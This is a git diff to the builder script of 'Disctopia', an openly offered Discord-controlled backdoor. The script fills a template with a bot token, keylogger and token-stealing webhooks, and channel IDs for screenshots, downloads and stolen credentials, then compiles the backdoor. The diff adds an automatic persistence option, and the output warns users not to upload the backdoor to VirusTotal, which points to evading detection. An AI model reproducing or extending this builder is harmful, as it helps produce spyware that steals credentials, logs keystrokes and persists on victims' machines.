@@ -5,12 +5,14 @@ import subprocess
 import os
 import argparse
 from prettytable import PrettyTable
+from sys import platform as OS
 
 class Builder:
     
-    def __init__(self,BACKDOOR_NAME,BOT_TOKEN,TOKEN_WEBHOOK,KEYLOGGER_WEBHOOK,SCREENSHOTS_ID,DOWNLOADS_ID,AGENT_ONLINE_ID,CREDENTIALS_ID,KEYLOG,DEBUG):
+    def __init__(self,BACKDOOR_NAME,BOT_TOKEN,TOKEN_WEBHOOK,KEYLOGGER_WEBHOOK,SCREENSHOTS_ID,DOWNLOADS_ID,AGENT_ONLINE_ID,CREDENTIALS_ID,KEYLOG,PERSISTENT,DEBUG):
         self.BACKDOOR_NAME = BACKDOOR_NAME
         self.KEYLOG = KEYLOG
+        self.PERSISTENT = PERSISTENT
         self.KEYLOGGER_WEBHOOK = KEYLOGGER_WEBHOOK
         self.BOT_TOKEN = BOT_TOKEN
         self.TOKEN_WEBHOOK = TOKEN_WEBHOOK
@@ -29,6 +31,7 @@ class Builder:
         f.close()
 
         newfile = file.replace("{KEYLOG}", str(self.KEYLOG).capitalize())
+        newfile = newfile.replace("{PERSISTENT}", str(self.PERSISTENT))
         newfile = newfile.replace("{BOT_TOKEN}", str(self.BOT_TOKEN))
         newfile = newfile.replace("{TOKEN_WEBHOOK}", str(self.TOKEN_WEBHOOK))
         newfile = newfile.replace("{KEYLOGGER_WEBHOOK}", str(self.KEYLOGGER_WEBHOOK))
@@ -56,6 +59,15 @@ class Builder:
         except FileNotFoundError:
             pass
 
+def clear_screen():
+    
+    if OS == "win32":
+        os.system("cls")
+    if OS == "linux" or OS == "linux2":
+        os.system("clear")
+
+clear_screen()
+
 print('''
 ▓█████▄  ██▓  ██████  ▄████▄  ▄▄▄█████▓ ▒█████   ██▓███   ██▓ ▄▄▄      
 ▒██▀ ██▌▓██▒▒██    ▒ ▒██▀ ▀█  ▓  ██▒ ▓▒▒██▒  ██▒▓██░  ██▒▓██▒▒████▄    
@@ -68,9 +80,9 @@ print('''
    ░     ░        ░  ░ ░                   ░ ░            ░        ░  ░
  ░                   ░                                                 
 
-Made by Dimitris Kalopisis | Twitter: @DKalopisis\n\n\n''')
+Made by Dimitris Kalopisis | Twitter: @DKalopisis | Version: 1.1.1\n\n\n''')
 
-list =["None","None","None","None","None","None","None","None","None"]
+list =["None","None","None","None","None","None","None","None","None","None"]
 
 def getArgs():
     parser = argparse.ArgumentParser(description='Disctopia Backdoor Builder')
@@ -90,6 +102,7 @@ def createTable(list):
     table.add_row(["Agent-Online-ID", list[6]])
     table.add_row(["Credentials-ID", list[7]])
     table.add_row(["Auto-Keylogger", list[8]])
+    table.add_row(["Auto-Persistent", list[9]])
 
     return table
 
@@ -105,6 +118,7 @@ def fetch(list):
         list[6] = data["settings"]["agent-online-id"]
         list[7] = data["settings"]["credentials-id"]
         list[8] = data["settings"]["auto-keylogger"]
+        list[9] = data["settings"]["auto-persistent"]
 
     return list
 
@@ -118,7 +132,7 @@ if arguments.build:
         if answer == "y":
             print("\n[+] Building the Backdoor")
             print("[+] Please wait...\n")
-            builder = Builder(list[0],list[1],list[2],list[3],list[4],list[5],list[6],list[7],list[8])
+            builder = Builder(list[0],list[1],list[2],list[3],list[4],list[5],list[6],list[7],list[8],list[9])
             builder.build()
             print('\n[+] The Backdoor can be found inside the "dist" directory')
             print('\nDO NOT UPLOAD THE BACKDOOR TO VIRUS TOTAL')
@@ -182,7 +196,7 @@ else:
                             debug = True 
                         else:
                             debug = False
-                        builder = Builder(BACKDOOR_NAME=list[0],BOT_TOKEN=list[1],TOKEN_WEBHOOK=list[2],KEYLOGGER_WEBHOOK=list[3],SCREENSHOTS_ID=list[4],DOWNLOADS_ID=list[5],AGENT_ONLINE_ID=list[6],CREDENTIALS_ID=list[7],KEYLOG=list[8],DEBUG=debug)
+                        builder = Builder(BACKDOOR_NAME=list[0],BOT_TOKEN=list[1],TOKEN_WEBHOOK=list[2],KEYLOGGER_WEBHOOK=list[3],SCREENSHOTS_ID=list[4],DOWNLOADS_ID=list[5],AGENT_ONLINE_ID=list[6],CREDENTIALS_ID=list[7],KEYLOG=list[8],PERSISTENT=list[9],DEBUG=debug)
                         builder.build()
                         cont = False
                         print('\n[+] The Backdoor can be found inside the "dist" directory')
@@ -231,6 +245,10 @@ else:
                     elif command_list[1].lower() == "auto-keylogger":
                         list[8] = command_list[2]
                         print(f"\n[+] Changed Auto-Keylogger\n")
+
+                    elif command_list[1].lower() == "auto-persistent":
+                        list[9] = command_list[2]
+                        print(f"\n[+] Changed Auto-Persistent\n")
 
                     else:
                         print(f'\n[-] Unknown Setting "{command_list[1]}" Try "help"\n')
